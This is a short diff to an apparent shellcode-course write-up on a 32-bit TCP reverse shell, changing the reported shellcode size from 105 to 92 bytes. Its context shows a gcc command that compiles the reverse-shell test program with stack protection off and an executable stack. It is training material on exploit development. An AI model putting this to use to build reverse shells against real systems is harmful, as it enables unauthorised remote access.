@@ -736,7 +736,7 @@ unsigned char code[] =
 #### POC (Final Shellcode) 
 ------
 
-The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 105 bytes:
+The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 92 bytes:
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final
